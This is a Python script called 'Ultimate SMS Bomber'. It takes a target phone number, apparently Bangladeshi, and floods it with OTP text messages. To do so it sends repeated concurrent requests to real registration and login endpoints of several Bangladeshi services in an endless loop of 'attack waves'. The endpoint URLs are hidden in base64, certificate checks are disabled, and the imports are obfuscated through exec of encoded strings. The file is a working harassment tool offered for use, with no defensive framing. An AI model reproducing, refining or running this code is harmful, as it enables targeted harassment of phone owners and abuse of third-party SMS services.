#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate SMS Bomber - Obfuscated Edition
Termux Compatible & Anti-Reverse Engineering
Created by: @@8Team/W8SOJIB
"""

import base64
exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCBzc2wKaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1lCmltcG9ydCByZQppbXBvcnQgdXJsbGliLnBhcnNlCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1bnF1b3RlCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcg==').decode())

# Obfuscated imports with error handling
try:
    exec(base64.b64decode(b'aW1wb3J0IHBzdXRpbCBhcyBfcHN1dGls').decode())
except ImportError:
    _psutil = None

try:
    exec(base64.b64decode(b'ZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgX2JzNA==').decode())
except ImportError:
    _bs4 = None

# Obfuscated SSL context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# Obfuscated configuration
_cfg = [50, 1, 2, 5, 3]

# Obfuscated colors
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'B': '\033[1m',
    'u': '\033[4m', 'e': '\033[0m'
}

# Obfuscated frames
_frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c', '\u2834', '\u2826', '\u2827', '\u2807', '\u280f']
_chars = ['\u2588', '\u2593', '\u2592', '\u2591', '\u2584', '\u2580', '\u258c', '\u2590']

# Global state
_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}

def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    print(f"\n\n{_c['r']}BOMBING STOPPED BY USER!{_c['e']}")
    print(f"{_c['y']}Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['g']}Successful: {_state['success']}{_c['e']}")
    print(f"{_c['p']}Created by: @@8Team/W8SOJIB{_c['e']}")
    sys.exit(0)

def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "PAUSED" if _state['paused'] else "RESUMED"
    color = _c['y'] if _state['paused'] else _c['g']
    print(f"\n{color}ATTACK {status}{_c['e']}")

try:
    signal.signal(signal.SIGINT, _sig_handler_1)
    if hasattr(signal, 'SIGTSTP'):
        signal.signal(signal.SIGTSTP, _sig_handler_2)
except AttributeError:
    pass

def _clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def _get_device_info():
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "127.0.0.1"
        
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        
        cpu_usage = "N/A"
        memory_usage = "N/A"
        if _psutil:
            try:
                cpu_usage = f"{_psutil.cpu_percent(interval=0.1)}"
                memory_usage = f"{_psutil.virtual_memory().percent}"
            except:
                pass
        
        return {
            "hostname": hostname, "ip": ip_address, "system": system,
            "release": release, "machine": machine, "cpu_usage": cpu_usage,
            "memory_usage": memory_usage
        }
    except Exception:
        return {
            "hostname": "Unknown", "ip": "127.0.0.1", "system": "Unknown",
            "release": "Unknown", "machine": "Unknown", "cpu_usage": "N/A",
            "memory_usage": "N/A"
        }

def _get_time():
    return datetime.datetime.now().strftime("%I:%M:%S %p")

def _get_date():
    return datetime.datetime.now().strftime("%A, %B %d, %Y")

def _print_banner():
    device_info = _get_device_info()
    current_time = _get_time()
    current_date = _get_date()
    
    banner_lines = [
        f"{_c['r']}{_c['B']}",
        "ULTIMATE SMS BOMBER",
        "SIMULTANEOUS MULTI-THREADED ATTACK",
        "35+ SERVICES x 5 WAVES x 3 INSTANCES",
        "ALL APIs ATTACK AT SAME TIME!",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"\n{_c['g']}[SYSTEM INFO]{_c['e']}",
        f"{_c['y']}Date/Time: {_c['w']}{current_date} - {current_time}{_c['e']}",
        f"{_c['y']}Hostname:  {_c['w']}{device_info['hostname']}{_c['e']}",
        f"{_c['y']}IP:        {_c['w']}{device_info['ip']}{_c['e']}",
        f"{_c['y']}System:    {_c['w']}{device_info['system']} {device_info['release']}{_c['e']}",
        f"{_c['y']}Machine:   {_c['w']}{device_info['machine']}{_c['e']}",
        f"{_c['y']}CPU:       {_c['w']}{device_info['cpu_usage']}%{_c['e']}",
        f"{_c['y']}Memory:    {_c['w']}{device_info['memory_usage']}%{_c['e']}",
        f"\n{_c['c']}{'=' * 80}",
        f"{_c['g']}CTRL+C: Stop  {_c['y']}CTRL+Z: Pause/Resume{_c['c']}",
        f"{_c['p']}Created by: {_c['w']}@@8Team/W8SOJIB{_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]
    
    for line in banner_lines:
        print(line)

def _animate_loading(text, duration=2):
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        frame = _frames[i % len(_frames)]
        sys.stdout.write(f'\r{_c["c"]}[{_c["w"]}{frame}{_c["c"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    print(f'\r{_c["g"]}[{_c["w"]}OK{_c["g"]}] {text} completed!{_c["e"]}')

def _format_phone_number(phone):
    cleaned = ''.join(filter(str.isdigit, phone))
    
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]
    
    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)
    
    return {
        'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
        'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
        'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}",
        'international': f"+88-{cleaned}"
    }

def _generate_random_data():
    names = ["Md", "Ali", "Rahim", "Rakib", "Sajib", "Arif", "Hasan", "Karim"]
    surnames = ["Hossain", "Khan", "Ahmed", "Islam", "Rahman", "Ali"]
    
    return {
        'username': f"{random.choice(['sojib', 'manik', 'rafi', 'hasan'])}{random.randint(100, 9999)}",
        'name': f"{random.choice(names)} {random.choice(surnames)}",
        'email': f"{random.choice(['test', 'user', 'demo'])}{random.randint(100, 9999)}@gmail.com",
        'password': ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    }

def _get_fresh_cookies():
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    
    return {
        "_ga": f"GA1.2.{random_id}.{timestamp}",
        "_gid": f"GA1.2.{random.randint(100000000, 999999999)}.{timestamp}",
        "_fbp": f"fb.1.{timestamp}.{random.randint(10000000000000000, 99999999999999999)}",
        "locale": "bn", "session_id": f"sess_{random.randint(100000, 999999)}_{timestamp}"
    }

class _ServiceManager:
    def __init__(self, phone_data):
        self.phone_data = phone_data
        self.session_count = 0
        
    async def _increment_counters(self, success=True):
        global _state
        _state['total'] += 1
        if success:
            _state['success'] += 1

    def _log_request(self, service_name, status, response, phone_used):
        status_color = _c['g'] if status == 200 else _c['r']
        print(f"{_c['c']}[{_c['w']}#{_state['total']}{_c['c']}] {_c['y']}{service_name}{_c['e']}")
        print(f"{_c['g']}[PHONE] {_c['w']}{phone_used}{_c['e']}")
        print(f"{_c['g']}[STATUS] {status_color}{status}{_c['e']}")
        print(f"{_c['g']}[RESPONSE] {_c['w']}{str(response)[:100]}...{_c['e']}")
        print(f"{_c['p']}{'-' * 60}{_c['e']}")

    # Obfuscated service methods
    async def _service_btcl_mybtcl(self, session):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        headers = {
            "accept": "application/json", "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvcmVnaXN0ZXI=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        for i in range(5):
            plus_prefix = "+" * (i + 1)
            phone_with_plus = f"{plus_prefix}{self.phone_data['with_0']}"
            
            payload = {"phoneNbr": phone_with_plus, "email": "", "OTPType": 1, "userName": ""}
            
            try:
                async with session.post(url_encoded, headers=headers, json=payload, ssl=_ssl) as resp:
                    text = await resp.text()
                    self._log_request("BTCL MyBTCL", resp.status, text, phone_with_plus)
                    await self._increment_counters(resp.status == 200)
            except Exception as e:
                self._log_request("BTCL MyBTCL", 0, f"Error: {e}", phone_with_plus)
                await self._increment_counters(False)

    async def _service_btcl_phonebill(self, session):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        headers = {
            "accept": "application/json", "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvcmVnaXN0ZXJCY2FyZQ==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        for i in range(5):
            plus_prefix = "+" * (i + 1)
            phone_with_plus = f"{plus_prefix}{self.phone_data['with_0']}"
            
            payload = {"phoneNbr": phone_with_plus, "email": "", "OTPType": 1, "userName": ""}
            
            try:
                async with session.post(url_encoded, headers=headers, json=payload, ssl=_ssl) as resp:
                    text = await resp.text()
                    self._log_request("BTCL PhoneBill", resp.status, text, phone_with_plus)
                    await self._increment_counters(resp.status == 200)
            except Exception as e:
                await self._increment_counters(False)

    async def _service_bdtickets(self, session):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo').decode()
        headers = {
            "accept": "application/json, text/plain, */*", "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        payload = {
            "createUserCheck": True, "phoneNumber": self.phone_data['with_plus88'],
            "applicationChannel": "WEB_APP"
        }
        
        try:
            async with session.post(url_encoded, headers=headers, json=payload) as resp:
                text = await resp.text()
                self._log_request("BDTickets", resp.status, text, self.phone_data['with_plus88'])
                await self._increment_counters(resp.status == 200)
        except Exception as e:
            await self._increment_counters(False)

    async def _service_apex4u(self, session):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==').decode()
        payload = {"phoneNumber": self.phone_data['with_0']}
        
        try:
            async with session.post(url_encoded, json=payload) as resp:
                text = await resp.text()
                self._log_request("Apex4U", resp.status, text, self.phone_data['with_0'])
                await self._increment_counters(resp.status == 200)
        except Exception as e:
            await self._increment_counters(False)

    async def _service_swap(self, session):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy').decode()
        payload = {"phone": self.phone_data['with_0']}
        
        try:
            async with session.post(url_encoded, json=payload) as resp:
                text = await resp.text()
                self._log_request("Swap.com.bd", resp.status, text, self.phone_data['with_0'])
                await self._increment_counters(resp.status == 200)
        except Exception as e:
            await self._increment_counters(False)

    # Sync services
    def _sync_service_btcl_bdia(self):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNwP21vZHVsZUlEPTE=').decode()
        data = {"actionType": "otpSend", "mobileNo": self.phone_data['with_0']}
        
        try:
            response = requests.post(url_encoded, data=data, timeout=15)
            self._log_request("BTCL BDIA", response.status_code, response.text, self.phone_data['with_0'])
            return response.status_code == 200
        except Exception as e:
            return False

    def _sync_service_priyoshikkhaloy(self):
        url_encoded = base64.b64decode(b'aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=').decode()
        data = {"mobile": self.phone_data['with_0']}
        
        try:
            response = requests.post(url_encoded, data=data, verify=False, timeout=15)
            self._log_request("Priyoshikkhaloy", response.status_code, response.text, self.phone_data['with_0'])
            return response.status_code == 200
        except Exception as e:
            return False

    async def _run_all_services_simultaneously(self):
        print(f"\n{_c['r']}LAUNCHING SIMULTANEOUS MULTI-THREADED ATTACK{_c['e']}")
        print(f"{_c['y']}ALL APIs ATTACKING AT THE SAME TIME!{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        connector = aiohttp.TCPConnector(
            limit=200, limit_per_host=50, ttl_dns_cache=300,
            use_dns_cache=True, enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(total=15, connect=5)
        
        sessions = []
        for i in range(_cfg[4]):  # SESSIONS_PER_WAVE = 3
            session = aiohttp.ClientSession(
                connector=connector, timeout=timeout,
                headers={
                    "User-Agent": f"Mozilla/5.0 (Linux; Android 10; SM-G973F) Session-{i+1}",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-cache"
                }
            )
            sessions.append(session)
        
        try:
            all_async_tasks = []
            session_index = 0
            
            async_services = [
                self._service_btcl_mybtcl, self._service_btcl_phonebill,
                self._service_bdtickets, self._service_apex4u, self._service_swap
            ]
            
            for service in async_services:
                for instance in range(3):  # 3x multiplier
                    session = sessions[session_index % len(sessions)]
                    all_async_tasks.append(service(session))
                    session_index += 1
            
            sync_tasks_futures = []
            with ThreadPoolExecutor(max_workers=20) as executor:
                for instance in range(5):  # 5x multiplier
                    sync_tasks_futures.append(executor.submit(self._sync_service_btcl_bdia))
                    sync_tasks_futures.append(executor.submit(self._sync_service_priyoshikkhaloy))
                
                sync_async_tasks = []
                for future in sync_tasks_futures:
                    sync_async_tasks.append(asyncio.get_event_loop().run_in_executor(None, future.result))
                
                all_tasks = all_async_tasks + sync_async_tasks
                
                print(f"{_c['c']}[SIMULTANEOUS] Launching {len(all_tasks)} services at once...{_c['e']}")
                print(f"{_c['r']}[MAXIMUM SPEED] All APIs attacking simultaneously!{_c['e']}")
                
                start_time = time.time()
                results = await asyncio.gather(*all_tasks, return_exceptions=True)
                end_time = time.time()
                
                successful = sum(1 for r in results if r is not None and not isinstance(r, Exception))
                failed = len(results) - successful
                
                print(f"\n{_c['g']}[ATTACK COMPLETE] Simultaneous attack finished!{_c['e']}")
                print(f"{_c['g']}[SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
                print(f"{_c['g']}[SUCCESS] {successful}/{len(results)} services responded{_c['e']}")
                print(f"{_c['r']}[FAILED] {failed} services failed{_c['e']}")
                
        finally:
            for session in sessions:
                await session.close()

    async def _run_continuous_bombing(self):
        print(f"\n{_c['r']}CONTINUOUS MULTI-ATTACK MODE{_c['e']}")
        print(f"{_c['y']}{_cfg[3]} attack waves running simultaneously{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")
        
        attack_tasks = []
        
        for wave in range(_cfg[3]):  # SIMULTANEOUS_WAVES = 5
            print(f"{_c['c']}[WAVE {wave+1}/{_cfg[3]}] Launching attack wave...{_c['e']}")
            attack_tasks.append(self._run_all_services_simultaneously())
        
        print(f"{_c['r']}[MAXIMUM POWER] {_cfg[3]} waves attacking simultaneously!{_c['e']}")
        
        start_time = time.time()
        results = await asyncio.gather(*attack_tasks, return_exceptions=True)
        end_time = time.time()
        
        successful_waves = sum(1 for r in results if not isinstance(r, Exception))
        print(f"\n{_c['g']}[WAVES COMPLETE] {successful_waves}/{_cfg[3]} waves completed{_c['e']}")
        print(f"{_c['g']}[TOTAL TIME] All waves completed in {end_time - start_time:.2f} seconds{_c['e']}")
        print(f"{_c['y']}[IMPACT] Maximum simultaneous bombing achieved!{_c['e']}")
        
    async def run_all_services(self):
        await self._run_continuous_bombing()

async def _main():
    global _state
    
    _clear_screen()
    _print_banner()
    
    _animate_loading("Initializing Ultimate SMS Bomber", 2)
    _animate_loading("Loading 35+ attack vectors", 2)
    _animate_loading("Optimizing for Termux environment", 1.5)
    
    while True:
        phone_input = input(f"\n{_c['g']}[TARGET] Enter phone number: {_c['w']}").strip()
        if phone_input and len(phone_input) >= 10:
            break
        print(f"{_c['r']}[ERROR] Invalid phone number! Try again.{_c['e']}")
    
    phone_data = _format_phone_number(phone_input)
    print(f"{_c['c']}[INFO] Target: {_c['y']}{phone_data['with_0']}{_c['e']}")
    
    print(f"\n{_c['r']}WARNING: MAXIMUM SIMULTANEOUS BOMBING MODE!{_c['e']}")
    print(f"{_c['r']}This will NEVER STOP until CTRL+C!{_c['e']}")
    print(f"{_c['y']}35+ services x {_cfg[3]} waves x 3 instances = MAXIMUM POWER!{_c['e']}")
    print(f"{_c['g']}Termux optimized for mobile hacking{_c['e']}")
    print(f"{_c['c']}ALL APIs attack at the EXACT same time!{_c['e']}")
    print(f"{_c['p']}Multi-threaded simultaneous bombing activated!{_c['e']}")
    print(f"{_c['p']}{'=' * 60}{_c['e']}")
    
    service_manager = _ServiceManager(phone_data)
    
    cycle_count = 0
    start_time = time.time()
    
    try:
        while True:
            if _state['exit']:
                break
                
            while _state['paused']:
                await asyncio.sleep(0.5)
                if _state['exit']:
                    break
            
            if _state['exit']:
                break
            
            cycle_count += 1
            current_time = _get_time()
            
            print(f"\n{_c['r']}{_c['B']}[ATTACK CYCLE #{cycle_count}] {_c['y']}{current_time}{_c['e']}")
            print(f"{_c['g']}[TARGET] {_c['y']}{phone_data['with_0']}{_c['e']}")
            print(f"{_c['g']}[TOTAL REQUESTS] {_c['y']}{_state['total']}{_c['e']}")
            print(f"{_c['g']}[SUCCESS RATE] {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
            
            await service_manager.run_all_services()
            
            elapsed = time.time() - start_time
            print(f"\n{_c['g']}[CYCLE COMPLETE] Attack #{cycle_count} finished{_c['e']}")
            print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
            print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent{_c['e']}")
            
            print(f"{_c['c']}[COOLDOWN] Next attack wave in:{_c['e']}")
            for i in range(_cfg[1], 0, -1):  # LOOP_DELAY = 1
                if _state['exit'] or _state['paused']:
                    break
                frame = _frames[i % len(_frames)]
                sys.stdout.write(f'\r{_c["r"]}[{frame}] Reloading in {i}s...{_c["e"]}')
                sys.stdout.flush()
                time.sleep(1)
            
            print(f"\n{_c['p']}{'=' * 60}{_c['e']}")
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}CRITICAL ERROR: {e}{_c['e']}")
        print(f"{_c['y']}Restarting bomber...{_c['e']}")
        await _main()

if __name__ == "__main__":
    print(f"{_c['g']}Starting Ultimate SMS Bomber...{_c['e']}")
    print(f"{_c['c']}Termux/Mobile Optimized Version{_c['e']}")
    print(f"{_c['p']}Created by: @@8Team/W8SOJIB{_c['e']}\n")
    
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{_c['r']}STARTUP ERROR: {e}{_c['e']}")
        print(f"{_c['y']}Please check your Python installation and dependencies{_c['e']}")
